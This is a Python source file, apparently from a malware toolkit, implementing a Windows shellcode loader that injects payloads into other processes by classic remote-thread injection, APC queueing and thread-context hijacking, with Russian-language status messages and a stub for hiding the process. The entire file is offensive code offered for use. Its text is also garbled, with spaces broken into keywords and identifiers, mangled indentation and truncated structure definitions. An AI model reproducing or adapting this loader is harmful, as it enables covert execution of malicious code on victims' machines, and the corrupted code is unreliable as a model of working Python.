import os



import ctypes



import time



import random



from typ in gimport List,Dict,Any,Union,Optional,Tuple







from core.interfacesimport Bas eLoader











clas sPROCESS_INFORMATION(ctypes.Structure):



    _fields_=[



("hProcess",ctypes.c_void_p),



("hThread",ctypes.c_void_p),



("dwProcessId",ctypes.c_ulong),



("dwThreadId",ctypes.c_ulong)



]







clas sSTARTUPINFO(ctypes.Structure):



    _fields_=[



("cb",ctypes.c_ulong),



("lpReserved",ctypes.c_void_p),



("lpDesktop",ctypes.c_void_p),



("lpTitle",ctypes.c_void_p),



("dwX",ctypes.c_ulong),



("dwY",ctypes.c_ulong),



("dwXSize",ctypes.c_ulong),



("dwYSize",ctypes.c_ulong),



("dwXCountChars",ctypes.c_ulong),



("dwYCountChars",ctypes.c_ulong),



("dwFillAttribute",ctypes.c_ulong),



("dwFlags",ctypes.c_ulong),



("wShowW in dow",ctypes.c_ushort),



("cbReserved2",ctypes.c_ushort),



("lpReserved2",ctypes.c_void_p),



("hStdInput",ctypes.c_void_p),



("hStdOutput",ctypes.c_void_p),



("hStdError",ctypes.c_void_p)



]











PAGE_EXECUTE_READWRITE=0x40



PROCESS_ALL_ACCESS=0x1F0FFF



MEM_COMMIT=0x1000



MEM_RESERVE=0x2000







clas sProcessInjectionLoader(Bas eLoader):











def__init__(self):



        self.kernel32=ctypes.w in dll.kernel32



self.ntdll=ctypes.w in dll.ntdll







defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







technique=kwargs.get("technique","clas sic")



create_suspended=kwargs.get("create_suspended",False)



hide_process=kwargs.get("hide_process",False)



process_id=None











if target_processandtarget_process.isdigit():



            process_id=int(target_process)







elif target_processandnottarget_process.isdigit():



            process_id=self._f in d_process_by_name(target_process)



if notprocess_idandcreate_suspended:



                process_id,handle=self._create_process(target_process,suspended=True)



if notprocess_id:



                    return False



else:







            if create_suspended:



                if os.path.exists(kwargs.get("new_process","")):



                    process_id,handle=self._create_process(kwargs.get("new_process"),suspended=True)



else:



                    process_id,handle=self._create_process("notepad.exe",suspended=True)



else:



                raiseValueError("Необходимо указать PID или имя процесса для внедрения")











if technique=="clas sic":



            success=self._clas sic_injection(process_id,payload)



elif technique=="apc":



            success=self._apc_injection(process_id,payload)



elif technique=="hijack":



            success=self._thread_hijack in g(process_id,payload)



else:



            raiseValueError(f"Неизвестный метод внедрения: {technique}")







if hide_processandsuccess:



            self._hide_process(process_id)







return success







def_f in d_process_by_name(self,process_name:str)->Optional[int]:







import psutil







forproc in psutil.process_iter(['pid','name']):



            if process_name.lower()inproc.info['name'].lower():



                return proc.info['pid']







return None







def_create_process(self,process_path:str,suspended:bool=False)->Tuple[int,object]:







startup_info=STARTUPINFO()



startup_info.cb=ctypes.sizeof(STARTUPINFO)



startup_info.dwFlags=0x1



startup_info.wShowW in dow=0







process_info=PROCESS_INFORMATION()







creation_flags=0



if suspended:



            creation_flags|=0x4







if notself.kernel32.CreateProcessA(



None,



process_path.encode('utf-8'),



None,



None,



False,



creation_flags,



None,



None,



ctypes.byref(startup_info),



ctypes.byref(process_info)



):



            pr in t(f"Ошибка при создании процесса: {ctypes.GetLas tError()}")



return None,None







return process_info.dwProcessId,process_info.hProcess







def_clas sic_injection(self,pid:int,shellcode:bytes)->bool:











h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)



if noth_process:



            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")



return False











shellcode_size=len(shellcode)



remote_memory=self.kernel32.VirtualAllocEx(



h_process,



None,



shellcode_size,



MEM_COMMIT|MEM_RESERVE,



PAGE_EXECUTE_READWRITE



)







if notremote_memory:



            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











bytes_written=ctypes.c_size_t(0)



result=self.kernel32.WriteProcessMemory(



h_process,



remote_memory,



shellcode,



shellcode_size,



ctypes.byref(bytes_written)



)







if notresultorbytes_written.value!=shellcode_size:



            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











h_thread=self.kernel32.CreateRemoteThread(



h_process,



None,



0,



remote_memory,



None,



0,



None



)







if noth_thread:



            pr in t(f"Не удалось создать удаленный поток в процессе {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











self.kernel32.CloseHandle(h_thread)



self.kernel32.CloseHandle(h_process)







pr in t(f"Шелл-код успешно внедрен в процесс {pid}")



return True







def_apc_injection(self,pid:int,shellcode:bytes)->bool:







import psutil











h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)



if noth_process:



            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")



return False











shellcode_size=len(shellcode)



remote_memory=self.kernel32.VirtualAllocEx(



h_process,



None,



shellcode_size,



MEM_COMMIT|MEM_RESERVE,



PAGE_EXECUTE_READWRITE



)







if notremote_memory:



            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











bytes_written=ctypes.c_size_t(0)



result=self.kernel32.WriteProcessMemory(



h_process,



remote_memory,



shellcode,



shellcode_size,



ctypes.byref(bytes_written)



)







if notresultorbytes_written.value!=shellcode_size:



            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











proc=psutil.Process(pid)



queued=False











forthread in proc.threads():



            thread_id=thread.id



h_thread=self.kernel32.OpenThread(0x1FFFFF,False,thread_id)







if h_thread:







                if self.kernel32.QueueUserAPC(remote_memory,h_thread,0):



                    pr in t(f"APC успешно добавлен в поток {thread_id}")



queued=True



else:



                    pr in t(f"Не удалось добавить APC в поток {thread_id}: {ctypes.GetLas tError()}")







self.kernel32.CloseHandle(h_thread)







if queued:



                break











self.kernel32.CloseHandle(h_process)







if notqueued:



            pr in t(f"Не удалось добавить APC ни в один поток процесса {pid}")



return False







pr in t(f"APC успешно добавлен в процесс {pid}")



return True







def_thread_hijack in g(self,pid:int,shellcode:bytes)->bool:







import psutil



import struct











h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)



if noth_process:



            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")



return False











shellcode_size=len(shellcode)



remote_memory=self.kernel32.VirtualAllocEx(



h_process,



None,



shellcode_size+0x1000,



MEM_COMMIT|MEM_RESERVE,



PAGE_EXECUTE_READWRITE



)







if notremote_memory:



            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











bytes_written=ctypes.c_size_t(0)



result=self.kernel32.WriteProcessMemory(



h_process,



remote_memory,



shellcode,



shellcode_size,



ctypes.byref(bytes_written)



)







if notresultorbytes_written.value!=shellcode_size:



            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")



self.kernel32.CloseHandle(h_process)



return False











proc=psutil.Process(pid)



hijacked=False











forthread in proc.threads():



            thread_id=thread.id



h_thread=self.kernel32.OpenThread(0x1FFFFF,False,thread_id)







if h_thread:







                if self.kernel32.SuspendThread(h_thread)!=0xFFFFFFFF:







                    context=self._get_thread_context(h_thread)







if context:







                        orig in al_rip=context.Ripif has attr(context,'Rip')elsecontext.Eip











if has attr(context,'Rip'):



                            context.Rip=remote_memory



else:



                            context.Eip=remote_memory











if self._set_thread_context(h_thread,context):



                            pr in t(f"Контекст потока {thread_id} успешно изменен")



hijacked=True



else:



                            pr in t(f"Не удалось изменить контекст потока {thread_id}: {ctypes.GetLas tError()}")







self.kernel32.ResumeThread(h_thread)











if hijacked:



                        self.kernel32.ResumeThread(h_thread)







self.kernel32.CloseHandle(h_thread)







if hijacked:



                break











self.kernel32.CloseHandle(h_process)







if nothijacked:



            pr in t(f"Не удалось захватить ни один поток процесса {pid}")



return False







pr in t(f"Поток процесса {pid} успешно захвачен")



return True







def_get_thread_context(self,h_thread):











clas sWOW64_CONTEXT(ctypes.Structure):



            _fields_=[



("ContextFlags",ctypes.c_ulong),







("Eip",ctypes.c_ulong),







]







clas sCONTEXT(ctypes.Structure):



            _fields_=[



("P1Home",ctypes.c_ulonglong),







("Rip",ctypes.c_ulonglong),







]











is_64bit=ctypes.sizeof(ctypes.c_void_p)==8







if is_64bit:







            context=CONTEXT()



context.ContextFlags=0x10000|0x1







if notself.kernel32.GetThreadContext(h_thread,ctypes.byref(context)):



                pr in t(f"Не удалось получить контекст потока: {ctypes.GetLas tError()}")



return None







return context



else:







            context=WOW64_CONTEXT()



context.ContextFlags=0x10000|0x1







if notself.kernel32.Wow64GetThreadContext(h_thread,ctypes.byref(context)):



                pr in t(f"Не удалось получить контекст потока: {ctypes.GetLas tError()}")



return None







return context







def_set_thread_context(self,h_thread,context)->bool:











is_64bit=ctypes.sizeof(ctypes.c_void_p)==8







if is_64bit:







            return bool(self.kernel32.SetThreadContext(h_thread,ctypes.byref(context)))



else:







            return bool(self.kernel32.Wow64SetThreadContext(h_thread,ctypes.byref(context)))







def_hide_process(self,pid:int)->bool:



















pr in t(f"[!] Скрытие процесса {pid} не реализовано")



return False







defsupported_platforms(self)->List[str]:







return["w in dows"]